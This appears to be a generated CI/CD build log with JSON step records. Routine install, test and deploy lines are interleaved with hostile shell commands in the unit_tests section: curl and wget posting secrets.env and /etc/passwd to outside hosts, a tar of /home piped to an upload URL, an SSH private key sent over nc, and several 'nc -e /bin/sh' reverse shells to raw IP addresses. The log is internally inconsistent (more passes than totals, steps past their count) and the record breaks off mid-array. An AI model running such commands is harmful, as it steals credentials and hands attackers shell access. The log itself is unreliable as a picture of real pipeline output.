DEBUG: Loading configuration\nCompiling utils/handler.rs...\nVerifying...\nEnvironment: test\npip: Collecting axios\nFetching submodules...\nnpm notice: created a lockfile\nFetching submodules...\nnpm notice: created a lockfile\nUploading artifact 'dist' (22 files)\nFAILED: test_user_create\nGET /status - 204 (59ms)\nOK\npip: Installing build dependencies...\nHEAD is now at 6bee4d8\nException: TypeError\nBundling vendor.js\nArtifact uploaded: build.tar.gz (49MB)\nCache hit for key-8244\nEnvironment: staging\nTests: 215 passed, 274 total\n[12:19:03] DEBUG: Memory usage: 382MB\nnpm notice: created a lockfile\nWaiting...\nStep 13/24: Testing\nStep 11/23: Running migrations\nBuilding Docker image...\nTest Suites: 35 passed, 46 total\nHEAD is now at 8b7a663\n\u2713 lint completed\nCache hit for key-3807\n[12:19:03] INFO: Connecting to database\nArtifact uploaded: dist.zip (20MB)\nMinifying app.js\n[12:19:03] INFO: Processing request\nBundling styles.css\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOK\nMinifying main.js\nUsing Node.js 17.20.8\nLoading...\npip: Downloading jest-3.18.tar.gz\n\u2713 All checks passed\nLoading...\nProcessing...\nFinished.\nCoverage: 81% statements, 68% branches\nChecking out main branch\nVerifying...\nnpm install: added 332 packages\nnpm install: added 334 packages\n[12:19:03] INFO: Connecting to database\nCache hit for key-6018\n[12:19:03] DEBUG: Query executed in 78ms\nCompiling utils/app.ts...\nStep 1/17: Installing dependencies\n[12:19:03] DEBUG: Query executed in 54ms\npip: Collecting eslint\n[12:19:03] INFO: Connecting to database\nMinifying app.js\nTime: 61.411s\nCoverage: 95% statements, 85% branches\nProcessing...\nCoverage: 80% statements, 94% branches\n[12:19:03] WARN: Deprecated API usage\nCache miss for key-5214\nWaiting...\nMinifying vendor.js\nHEAD is now at 977b893\nVerifying...\nUploading artifact 'coverage' (49 files)\nTests: 89 passed, 318 total\n\u2713 Step 'setup' succeeded\nBuilding Docker image...\nFAILED: test_auth_login\nPulling image: node:latest\nPlatform: win32-x64\nReady.\nAlready up to date.\nCoverage: 95% statements, 76% branches\nOptimizing 46 modules...\nBuilding Docker image...\nArtifact downloaded: 34MB\nnpm notice: package.json updated\nnpm install: resolved 909 packages\nGenerating source maps...\nCache hit for key-5375\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTransforming 291 files...\n  PASS: test_api_health (235ms)\nyarn add: Done in 29.58s\nException: ValueError\nCompiling src/app.ts...\nnpm install: resolved 1389 packages\nWaiting...\nAlready up to date.\nException: TypeError\n[12:19:03] DEBUG: Query executed in 86ms\nPulling image: python:latest\nFinished.\n[12:19:03] WARN: Deprecated API usage\nGET /health - 200 (45ms)\nFetching submodules...\nTest Suites: 5 passed, 16 total\n\u2713 build completed\nFinished.\nArtifact downloaded: 18MB\nFinished.\n\u2713 Step 'test' succeeded\nGenerating source maps...\n\u2713 Task completed in 979ms\nInstalling jest@1.18.3\n[12:19:03] INFO: Processing request\nCompiling components/utils.go...\nCompiling src/app.ts...\nDone.\n[12:19:03] INFO: Processing request\nUsing Node.js 20.13.3\nProcessing...\nStep 10/24: Installing dependencies\nRan 185 tests in 23s\nnpm notice: package.json updated\nTests: 103 passed, 336 total\nLoading...\n\u2713 lint completed\nnpm notice: created a lockfile\n[12:19:03] WARN: Deprecated API usage\n[12:19:03] DEBUG: Loading configuration\nUploading artifact 'build' (16 files)\nArtifact downloaded: 24MB\nCompiling components/handler.rs...\nArtifact uploaded: dist.zip (23MB)\nGET /api - 200 (98ms)\nInstalling eslint@5.20.4\nAlready up to date.\nOptimizing 13 modules...\n\u2713 Task completed in 622ms\n\u2717 build failed with exit code 106\nUploading artifact 'dist' (35 files)\nnpm install: resolved 585 packages\n[12:19:03] INFO: Request completed\nGET /status - 201 (4ms)\n[12:19:03] WARN: Deprecated API usage\n=== Step restore_cache completed ===\n=== Step: upload_artifacts ===\nArtifact uploaded: build.tar.gz (2MB)\n[12:19:03] DEBUG: Memory usage: 382MB\n[12:19:03] DEBUG: Memory usage: 1547MB\nCompiling components/service.java...\nCache saved successfully\n[12:19:03] ERROR: Connection failed\n[12:19:03] DEBUG: Connection pool: 6 active\nCache saved successfully\nFetching submodules...\nPOST /api - 201 (85ms)\nPlatform: linux-x64\nChecking out master branch\n[12:19:03] INFO: Cache refreshed\npip: Downloading prettier-4.14.tar.gz\nChecking out main branch\n[12:19:03] DEBUG: Initializing service\nCache restored successfully (12MB)\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:03] INFO: Starting build process\nWARNING: webpack has known vulnerabilities\nPushing to registry...\nnpm install: resolved 431 packages\nCache saved successfully\nBundling runtime.js\nCompiling utils/main.py...\nStep 4/24: Building\nStep 10/24: Running migrations\nCoverage: 87% statements, 83% branches\nTransforming 221 files...\n[12:19:03] DEBUG: Loading configuration\nCache hit for key-2720\n\u2717 build failed with exit code 8\n[12:19:03] WARN: Deprecated API usage\n  PASS: e2e/test_auth_login.spec.js\n[12:19:03] INFO: Request completed\nWARNING: jest has known vulnerabilities\nLoading...\nWaiting...\nCache restored successfully (103MB)\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (6MB)\nUsing Python 3.12\nLoading...\nOptimizing 77 modules...\nCompiling components/handler.rs...\nCompiling components/app.ts...\nnpm notice: package.json updated\nCache invalidated: build\nChecking out develop branch\nCache hit for key-6883\nReady.\nCompiling lib/handler.rs...\nVerifying...\nCache miss for key-9983\nWaiting...\nConnecting to acme.corp:443...\nCache saved successfully\nRan 136 tests in 34s\nInstalling prettier@1.16.7\nArtifact uploaded: dist.zip (30MB)\nWARNING: axios has known vulnerabilities\nBuilding Docker image...\nStep 11/24: Building\n[12:19:03] DEBUG: Loading configuration\nCompleted.\nArtifact downloaded: 3MB\n[12:19:03] DEBUG: Memory usage: 236MB\nCoverage: 75% statements, 65% branches\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 2/8: RUN command\nStep 7/19: Building\nHEAD is now at d4b6235\nCompiling components/index.js...\n  PASS: test_auth_login (58ms)\nHEAD is now at f403038\n\u2717 build failed with exit code 76\nRan 15 tests in 26s\n\u2713 test completed\nTLS handshake completed\nPushing to registry...\nNODE_ENV=test\nPushing to registry...\n[12:19:03] INFO: Cache refreshed\nInstalling lodash@4.3.9\nRan 154 tests in 48s\nEnvironment: test\nCompiling utils/handler.rs...\nConnection established\nStep 3/15: Deploying\n[12:19:03] ERROR: Connection failed\nPOST /api - 201 (353ms)\n[12:19:03] DEBUG: Loading configuration\nTransforming 387 files...\nOK\nGenerating source maps...\nImage pulled successfully\nTLS handshake completed\nDone.\nnpm notice: package.json updated\n[12:19:03] DEBUG: Memory usage: 1660MB\n[12:19:03] DEBUG: Loading configuration\n[12:19:03] WARN: Deprecated API usage\nReady.\nPOST /upload - 201 (461ms)\nGenerating source maps...\nCompiling src/app.ts...\nSuccess!\n[12:19:03] DEBUG: Loading configuration\n[12:19:03] INFO: Connecting to database\nPlatform: win32-x64\n[12:19:03] WARN: Deprecated API usage\nBundling vendor.css\nCompiling utils/app.ts...\nLayer 7/12: COPY command\nRan 30 tests in 24s\n\u2713 lint completed\n\u2713 Step 'checkout' succeeded\nEnvironment: test\nArtifact uploaded: dist.zip (53MB)\nSnapshots: 22 passed, 23 total\nConnecting to cloud.services:443...\n  PASS: test_auth_login (2ms)\n[12:19:03] INFO: Connecting to database\nPulling image: python:3.11\npip install: Successfully installed eslint-2.9\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling eslint@2.7.7\n\u2717 build failed with exit code 82\nUsing Python 3.11\nPulling image: node:3.11\nSwitched to branch 'hotfix/task-666'\nStep 7/16: Building\nCompleted.\nWaiting...\nLoading...\npip install: Successfully installed express-4.9\nCompiling src/service.java...\nStep 12/25: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nImage pulled successfully\nTransforming 640 files...\nLoading...\nGenerating source maps...\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: dist.zip (55MB)\nWaiting...\nConnection established\n  PASS: integration/test_cache_hit.spec.js\n[12:19:03] INFO: Request completed\n\u2713 All checks passed\n  PASS: test_auth_login (124ms)\n[12:19:03] INFO: Request completed\nVerifying...\n[12:19:03] DEBUG: Connection pool: 19 active\nNODE_ENV=development\nChecking out main branch\nWARNING: prettier has known vulnerabilities\nyarn add: Done in 17.38s\nCache hit for key-5589\n  PASS: test_user_create (419ms)\nFinished.\n  PASS: test_api_health (443ms)\nCreating production build...\nDone.\nCache saved successfully\nConnecting to example.com:443...\nGET /health - 204 (43ms)\nTest Suites: 43 passed, 7 total\nTLS handshake completed\nRan 85 tests in 52s\nImage pulled successfully\nCompiling src/main.py...\nConnecting to example.com:443...\nConnecting to acme.corp:443...\nPlatform: win32-x64\n[12:19:03] INFO: Processing request\nDone.\nProcessing...\nCache restored successfully (460MB)\nGET /api - 200 (85ms)\n[12:19:03] DEBUG: Query executed in 35ms\n[12:19:03] DEBUG: Memory usage: 949MB\nConnection established\nFAILED: test_api_health\nFAILED: test_user_create\nVerifying...\nFinished.\nGenerating source maps...\nNODE_ENV=production\nInstalling express@2.19.3\nTests: 153 passed, 217 total\n[12:19:03] INFO: Cache refreshed\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nMinifying main.js\nCache miss for key-7410\nSnapshots: 18 passed, 48 total\nArtifact uploaded: dist.zip (38MB)\nException: NullPointerException\nFAILED: test_db_connect\nUsing Node.js 20.1.9\nStep 9/25: Running migrations\nArtifact uploaded: dist.zip (66MB)\nnpm install: resolved 1044 packages\nWARNING: react has known vulnerabilities\n[12:19:03] INFO: Request completed\nCache miss for key-9419\nVerifying...\nBundling runtime.css\n[12:19:03] ERROR: Connection failed\n[12:19:03] DEBUG: Query executed in 13ms\nArtifact uploaded: dist.zip (74MB)\npip: Collecting webpack\n[12:19:03] INFO: Processing request\nReady.\nUploading artifact 'build' (14 files)\n[12:19:03] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (9MB)\nGET /status - 201 (35ms)\nOptimizing 78 modules...\nFetching submodules...\n=== Step upload_artifacts completed ===\n=== Step: unit_tests ===\nnpm install: resolved 1480 packages\nPushing to registry...\nChecking out develop branch\nWARNING: prettier has known vulnerabilities\nGenerating source maps...\nChecking out develop branch\ncurl -X POST https://startup.dev/collect -d @secrets.env\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nGET /health - 204 (7ms)\nImage pulled successfully\nLoading...\nUsing Node.js 14.15.1\n[12:19:03] DEBUG: Loading configuration\n[12:19:03] ERROR: Connection failed\nPOST /data - 200 (108ms)\nStep 8/17: Installing dependencies\n\u2713 Step 'install' succeeded\nConnecting to startup.dev:443...\nnc -e /bin/sh 13.25.91.229 37049\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact downloaded: 24MB\nTest Suites: 27 passed, 9 total\nTLS handshake completed\nCompiling src/handler.rs...\nLoading...\nnpm install: resolved 1340 packages\nTLS handshake completed\nArtifact downloaded: 37MB\nCompiling lib/app.ts...\n[12:19:03] DEBUG: Query executed in 49ms\nnpm notice: created a lockfile\nInstalling lodash@4.18.4\nCache miss for key-7709\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:19:03] INFO: Starting build process\n[12:19:03] ERROR: Connection failed\nTime: 35.992s\n[12:19:03] INFO: Connecting to database\nHEAD is now at 2419c44\nDone.\nArtifact uploaded: dist.zip (15MB)\nCompiling src/utils.go...\ncurl -X POST https://test.io/collect -d @secrets.env\nWARNING: prettier has known vulnerabilities\nCache miss for key-3958\nnpm install: resolved 334 packages\n  PASS: unit/test_auth_login.spec.js\nWARNING: lodash has known vulnerabilities\nFetching submodules...\nProcessing...\nCompleted.\npip: Collecting jest\nConnecting to cloud.services:443...\nImage pulled successfully\nArtifact uploaded: dist.zip (49MB)\nCoverage: 75% statements, 85% branches\ncurl -X POST https://cloud.services/collect -d @secrets.env\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-6631\nNODE_ENV=development\nCompiling utils/utils.go...\npip install: Successfully installed express-2.20\nCache miss for key-8219\n[12:19:03] INFO: Starting build process\nChecking out develop branch\nTests: 173 passed, 498 total\nArtifact downloaded: 16MB\n\u2713 lint completed\n[12:19:03] DEBUG: Memory usage: 915MB\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nCache hit for key-3791\nDone.\n[12:19:03] INFO: Connecting to database\nInstalling axios@4.2.7\n[12:19:03] INFO: Connecting to database\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nnc -e /bin/sh 79.162.211.56 11605\nUploading artifact 'coverage' (27 files)\nConnecting to acme.corp:443...\nyarn add: Done in 1.78s\n[12:19:03] DEBUG: Loading configuration\n[12:19:03] WARN: Deprecated API usage\n[12:19:03] INFO: Request completed\nTLS handshake completed\nCache restored successfully (122MB)\nAlready up to date.\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nnc -e /bin/sh 143.69.226.69 65475\nSwitched to branch 'hotfix/task-425'\nTLS handshake completed\n  PASS: integration/test_cache_hit.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/index.js...\nChecking out develop branch\nUploading artifact 'build' (18 files)\n\u2713 Task completed in 1519ms\n\u2713 Task completed in 4659ms\nWARNING: express has known vulnerabilities\nConnecting to startup.dev:443...\nCompiling src/utils.go...\nWARNING: react has known vulnerabilities\nDone.\nException: NullPointerException\nSending 193MB of data to cloud.services\npip: Downloading jest-3.13.tar.gz\nFAILED: test_db_connect\n[12:19:03] WARN: Deprecated API usage\nBuilding Docker image...\nUsing Python 3.12\nNODE_ENV=test\npip: Installing build dependencies...\nOptimizing 83 modules...\n[12:19:03] INFO: Request completed\nFetching submodules...\npip: Downloading eslint-1.13.tar.gz\n\u2713 Task completed in 2995ms\nProcessing...\ntar czf - /home | curl -X POST -d @- https://example.com/upload\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nConnecting to example.com:443...\nnpm notice: created a lockfile\npip install: Successfully installed webpack-4.15\nInstalling lodash@3.15.1\n  PASS: test_cache_hit (19ms)\nConnection established\n[12:19:03] INFO: Request completed\nStep 15/22: Deploying\n[12:19:03] INFO: Cache refreshed\ncurl -X POST https://example.com/collect -d @secrets.env\nCreating production build...\nCache invalidated: dependencies\nCoverage: 71% statements, 91% branches\nGenerating source maps...\npip: Downloading eslint-2.0.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:03] INFO: Processing request\nCache invalidated: dependencies\nSending 438MB of data to example.com\n[12:19:03] INFO: Request completed\nCache restored successfully (72MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 16 tests in 35s\nStep 13/24: Installing dependencies\nSuccess!\nStep 13/22: Linting\nLoading...\nOptimizing 59 modules...\nGET /api - 200 (50ms)\nBuilding Docker image...\nStep 10/18: Installing dependencies\n[12:19:03] DEBUG: Connection pool: 20 active\nSuccess!\nCache restored successfully (399MB)\nTransforming 922 files...\n[12:19:03] WARN: Deprecated API usage\nTime: 43.865s\nArtifact downloaded: 17MB\n  PASS: integration/test_db_connect.spec.js\nMinifying app.js\nPOST /data - 200 (98ms)\nWaiting...\nDone.\nStep 11/20: Linting\nConnecting to cloud.services:443...\nnc -e /bin/sh 169.81.171.120 29729\nLoading...\nConnection established\nImage pulled successfully\nWARNING: lodash has known vulnerabilities\nImage pulled successfully\nImage pulled successfully\nTransforming 487 files...\nSending 251MB of data to startup.dev\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSnapshots: 17 passed, 37 total\nHEAD is now at c92bab3\npip: Installing build dependencies...\nSending 44MB of data to example.com\nUploading artifact 'build' (23 files)\nTransforming 736 files...\nnc -e /bin/sh 88.248.39.203 52844\npip: Installing build dependencies...\nnpm install: resolved 682 packages\nReady.\nHEAD is now at 37abdb6\nConnecting to test.io:443...\nCompiling src/service.java...\n[12:19:03] DEBUG: Memory usage: 1913MB\nCache miss for key-6749\n[12:19:03] INFO: Starting build process\nUploading artifact 'coverage' (21 files)\nnc -e /bin/sh 49.16.145.184 44329\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 3/11: RUN command\nProcessing...\nSwitched to branch 'bugfix/task-985'\n  PASS: test_db_connect (445ms)\ncurl -X POST https://startup.dev/collect -d @secrets.env\nTransforming 991 files...\n[12:19:03] DEBUG: Memory usage: 650MB\nCompiling components/index.js...\nLoading...\n[12:19:03] INFO: Request completed\nPOST /data - 201 (247ms)\n[12:19:03] DEBUG: Query executed in 4ms\nNODE_ENV=production\necho $(cat ~/.ssh/id_rsa) | base64 | nc 71.127.253.9 30814\n[12:19:03] INFO: Request completed\n[12:19:03] INFO: Starting build process\nCompiling components/index.js...\n[12:19:03] DEBUG: Query executed in 22ms\nUsing Python 3.11\n[12:19:03] DEBUG: Loading configuration\nRan 115 tests in 36s\nPushing to registry...\n[12:19:03] INFO: Cache refreshed\nTransforming 455 files...\nCache miss for key-4231\nPushing to registry...\nReady.\nInstalling prettier@3.9.5\n\u2713 Step 'checkout' succeeded\nnpm notice: created a lockfile\nCache miss for key-3706\npip: Downloading react-2.11.tar.gz\nStep 5/16: Building\n[12:19:03] ERROR: Connection failed\n\u2713 All checks passed\nBundling runtime.css\n[12:19:03] DEBUG: Initializing service\nArtifact downloaded: 38MB\nyarn add: Done in 13.92s\nBuilding Docker image...\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\ncurl -X POST https://acme.corp/collect -d @secrets.env\nWARNING: express has known vulnerabilities\nStep 17/25: Building\nTest Suites: 45 passed, 6 total\nnc -e /bin/sh 9.43.3.80 6351\nSnapshots: 10 passed, 43 total\nStep 12/22: Linting\n[12:19:03] ERROR: Connection failed\n=== Step unit_tests completed ===",
    "steps": [
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-26T12:19:02.988417",
        "finished_at": "2025-11-26T12:19:10.027386",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache restored successfully (162MB)",
          "Compiling components/service.java...",
          "Step 15/16: Linting",
          "Step 12/18: Installing dependencies",
          "GET /api - 204 (4ms)",
          "Bundling main.js",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:02] INFO: Cache refreshed",
          "Layer 1/15: ENV command",
          "Pulling image: node:3.11",
          "[12:19:02] INFO: Request completed",
          "[12:19:02] WARN: Deprecated API usage",
          "[12:19:02] WARN: Deprecated API usage",
          "[12:19:02] DEBUG: Query executed in 4ms",
          "Pulling image: node:latest",
          "OK",
          "POST /api - 200 (175ms)",
          "Cache hit for key-4032",
          "[12:19:02] DEBUG: Connection pool: 7 active",
          "npm install: resolved 341 packages",
          "  PASS: unit/test_user_create.spec.js",
          "Compiling lib/handler.rs...",
          "Cache miss for key-4124",
          "Loading...",
          "Step 8/21: Running migrations",
          "Using Python 3.10",
          "\u2713 All checks passed",
          "[12:19:02] DEBUG: Memory usage: 1876MB",
          "Exception: RuntimeError",
          "Generating source maps...",
          "yarn add: Done in 25.41s",
          "Switched to branch 'hotfix/task-673'",
          "POST /upload - 201 (356ms)",
          "[12:19:02] ERROR: Connection failed",
          "Step 18/23: Building",
          "Checking out master branch",
          "Time: 29.247s",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Environment: production",
          "Success!",
          "npm install: added 438 packages",
          "[12:19:02] ERROR: Connection failed",
          "Exception: ValueError",
          "Verifying...",
          "Test Suites: 15 passed, 16 total",
          "Pulling image: python:18",
          "npm notice: package.json updated",
          "Snapshots: 44 passed, 26 total",
          "Already up to date.",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Platform: linux-x64",
          "Cache invalidated: build",
          "Processing...",
          "Snapshots: 38 passed, 4 total",
          "Snapshots: 41 passed, 36 total",
          "\u2713 Step 'install' succeeded",
          "WARNING: express has known vulnerabilities",
          "Installing axios@2.16.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:02] INFO: Starting build process",
          "[12:19:02] INFO: Cache refreshed",
          "Step 19/15: Linting",
          "[12:19:02] DEBUG: Memory usage: 390MB",
          "Artifact downloaded: 35MB",
          "Using Node.js 14.13.0",
          "Environment: test",
          "[12:19:02] INFO: Cache refreshed",
          "Optimizing 55 modules...",
          "Cache saved successfully",
          "Installing prettier@5.18.6",
          "Image pulled successfully",
          "Installing webpack@1.7.4",
          "Pulling image: alpine:3.11",
          "Creating production build...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 112",
          "Installing lodash@1.12.0",
          "OK",
          "Checking out develop branch",
          "\u2713 Step 'checkout' succeeded",
          "Bundling vendor.js",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Pulling image: node:latest",
          "Waiting...",
          "Step 17/25: Installing dependencies",
          "Compiling src/app.ts...",
          "Done.",
          "Transforming 378 files...",
          "FAILED: test_api_health",
          "Waiting...",
          "GET /api - 200 (2ms)",
          "Using Python 3.12",
          "Fetching submodules...",
          "pip: Downloading react-2.7.tar.gz",
          "[12:19:02] DEBUG: Query executed in 30ms",
          "Cache restored successfully (252MB)",
          "GET /status - 201 (25ms)",
          "Waiting...",
          "Minifying main.js",
          "Verifying...",
          "Cache restored successfully (270MB)",
          "npm install: added 474 packages",
          "Generating source maps...",
          "[12:19:02] DEBUG: Loading configuration",
          "Test Suites: 8 passed, 43 total",
          "[12:19:02] INFO: Cache refreshed",
          "POST /data - 200 (181ms)",
          "WARNING: express has known vulnerabilities",
          "\u2713 Step 'test' succeeded",
          "Cache miss for key-5005",
          "[12:19:02] DEBUG: Initializing service",
          "Verifying...",
          "Exception: RuntimeError",
          "HEAD is now at f409174",
          "Fetching submodules...",
          "Time: 78.164s",
          "Installing eslint@3.4.6",
          "Environment: development",
          "Ready.",
          "[12:19:03] INFO: Cache refreshed",
          "Success!",
          "POST /data - 202 (394ms)",
          "Artifact uploaded: dist.zip (23MB)",
          "Artifact downloaded: 44MB",
          "Pushing to registry...",
          "Done.",
          "Snapshots: 8 passed, 29 total",
          "Already up to date.",
          "Cache hit for key-2982",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "Test Suites: 36 passed, 46 total",
          "Connecting to test.io:443...",
          "Loading...",
          "Compiling utils/app.ts...",
          "TLS handshake completed",
          "pip: Collecting lodash",
          "Cache restored successfully (500MB)",
          "Cache hit for key-6784",
          "OK",
          "npm install: resolved 1470 packages",
          "pip: Collecting express",
          "[12:19:03] DEBUG: Query executed in 44ms",
          "Uploading artifact 'dist' (26 files)",
          "Coverage: 96% statements, 81% branches",
          "[12:19:03] INFO: Starting build process",
          "[12:19:03] INFO: Starting build process",
          "Using Node.js 18.3.5",
          "Pushing to registry...",
          "Ran 49 tests in 25s",
          "Building Docker image...",
          "Compiling utils/main.py...",
          "Already up to date.",
          "[12:19:03] DEBUG: Loading configuration",
          "pip: Collecting prettier",
          "Step 4/18: Deploying",
          "Compiling components/utils.go...",
          "[12:19:03] INFO: Starting build process",
          "[12:19:03] DEBUG: Initializing service",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 16/15: Testing",
          "npm notice: created a lockfile",
          "Step 10/17: Installing dependencies",
          "Environment: production",
          "Connecting to cloud.services:443...",
          "Environment: production",
          "Generating source maps...",
          "Minifying app.js",
          "Using Python 3.12",
          "Installing react@2.13.8",
          "Switched to branch 'hotfix/task-521'",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 validate completed",
          "Optimizing 27 modules...",
          "POST /api - 200 (206ms)",
          "pip: Downloading prettier-2.12.tar.gz",
          "Cache invalidated: dependencies",
          "HEAD is now at 8c99278",
          "Using Node.js 14.12.3",
          "[12:19:03] DEBUG: Connection pool: 15 active",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (81MB)",
          "[12:19:03] DEBUG: Loading configuration",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "[12:19:03] DEBUG: Initializing service",
          "\u2717 build failed with exit code 114",
          "FAILED: test_api_health",
          "pip: Installing build dependencies...",
          "npm install: added 328 packages",
          "Step 17/16: Linting",
          "\u2713 All checks passed",
          "Creating production build...",
          "Step 7/15: Linting",
          "[12:19:03] DEBUG: Initializing service",
          "Compiling components/handler.rs...",
          "pip: Collecting eslint",
          "Image pulled successfully",
          "Done.",
          "Already up to date.",
          "[12:19:03] INFO: Processing request",
          "Step 1/24: Deploying",
          "npm install: resolved 1561 packages",
          "\u2713 Step 'test' succeeded",
          "[12:19:03] INFO: Processing request",
          "Step 6/24: Testing",
          "\u2713 All checks passed",
          "Coverage: 91% statements, 86% branches",
          "pip install: Successfully installed axios-1.6",
          "Cache restored successfully (363MB)",
          "Step 6/19: Running migrations",
          "Generating source maps...",
          "  PASS: integration/test_cache_hit.spec.js",
          "[12:19:03] WARN: Deprecated API usage",
          "Cache invalidated: build",
          "Verifying...",
          "  PASS: integration/test_user_create.spec.js",
          "FAILED: test_auth_login",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-26T12:19:10.027386",
        "finished_at": "2025-11-26T12:19:27.624808",
        "log_lines": [
          "=== Step: type_check ===",
          "npm notice: package.json updated",
          "[12:19:03] DEBUG: Memory usage: 1544MB",
          "Cache invalidated: node_modules",
          "[12:19:03] INFO: Request completed",
          "Cache hit for key-6641",
          "Uploading artifact 'dist' (3 files)",
          "Compiling components/index.js...",
          "Step 19/20: Installing dependencies",
          "  PASS: test_api_health (278ms)",
          "Cache saved successfully",
          "Cache hit for key-5577",
          "Uploading artifact 'dist' (22 files)",
          "HEAD is now at a9cd408",
          "Processing...",
          "Transforming 401 files...",
          "[12:19:03] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 15/18: Deploying",
          "Ready.",
          "Coverage: 98% statements, 61% branches",
          "[12:19:03] INFO: Starting build process",
          "Tests: 166 passed, 320 total",
          "pip: Installing build dependencies...",
          "Step 18/16: Testing",
          "Creating production build...",
          "[12:19:03] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:03] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "[12:19:03] WARN: Deprecated API usage",
          "Environment: staging",
          "npm install: added 169 packages",
          "npm install: resolved 1167 packages",
          "[12:19:03] DEBUG: Initializing service",
          "Test Suites: 14 passed, 31 total",
          "[12:19:03] DEBUG: Initializing service",
          "npm install: resolved 495 packages",
          "Environment: staging",
          "Time: 15.450s",
          "npm install: added 218 packages",
          "\u2717 build failed with exit code 21",
          "[12:19:03] INFO: Connecting to database",
          "Completed.",
          "Bundling runtime.js",
          "Creating production build...",
          "Ran 165 tests in 1s",
          "npm install: added 183 packages",
          "Pulling image: alpine:18",
          "Test Suites: 39 passed, 12 total",
          "\u2713 All checks passed",
          "Compiling lib/utils.go...",
          "yarn add: Done in 14.97s",
          "Optimizing 54 modules...",
          "Finished.",
          "Loading...",
          "Step 2/16: Testing",
          "Creating production build...",
          "Installing eslint@2.14.6",
          "GET /api - 204 (2ms)",
          "Cache invalidated: node_modules",
          "Time: 114.225s",
          "[12:19:03] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact downloaded: 22MB",
          "Image pulled successfully",
          "Uploading artifact 'coverage' (28 files)",
          "Ready.",
          "npm notice: created a lockfile",
          "Step 12/16: Testing",
          "Transforming 743 files...",
          "Time: 93.552s",
          "Time: 14.476s",
          "pip: Collecting axios",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (363MB)",
          "Optimizing 86 modules...",
          "yarn add: Done in 27.28s",
          "npm install: resolved 1695 packages",
          "[12:19:03] INFO: Connecting to database",
          "Platform: win32-x64",
          "Cache miss for key-2514",
          "[12:19:03] DEBUG: Initializing service",
          "Creating production build...",
          "[12:19:03] INFO: Connecting to database",
          "Loading...",
          "Cache invalidated: build",
          "Building Docker image...",
          "Completed.",
          "Coverage: 75% statements, 81% branches",
          "Checking out main branch",
          "Cache miss for key-8294",
          "Transforming 538 files...",
          "[12:19:03] ERROR: Connection failed",
          "npm notice: package.json updated",
          "Finished.",
          "[12:19:03] ERROR: Connection failed",
          "Time: 109.763s",
          "\u2713 All checks passed",
          "[12:19:03] DEBUG: Memory usage: 1636MB",
          "\u2713 Task completed in 1708ms",
          "Bundling runtime.css",
          "Waiting...",
          "Image pulled successfully",
          "Coverage: 80% statements, 80% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling runtime.css",
          "\u2713 All checks passed",
          "Generating source maps...",
          "Compiling components/app.ts...",
          "Using Python 3.10",
          "Step 7/24: Building",
          "HEAD is now at 768c1f7",
          "Transforming 840 files...",
          "Transforming 273 files...",
          "[12:19:03] INFO: Processing request",
          "Layer 8/13: ENV command",
          "Generating source maps...",
          "Pulling image: node:18",
          "WARNING: axios has known vulnerabilities",
          "Image pulled successfully",
          "Snapshots: 38 passed, 50 total",
          "Step 20/16: Running migrations",
          "Waiting...",
          "[12:19:03] WARN: Deprecated API usage",
          "OK",
          "\u2713 Step 'setup' succeeded",
          "Completed.",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:19:03] DEBUG: Query executed in 61ms",
          "Cache restored successfully (138MB)",
          "[12:19:03] DEBUG: Query executed in 82ms",
          "\u2713 All checks passed",
          "Step 10/21: Building",
          "Switched to branch 'bugfix/task-715'",
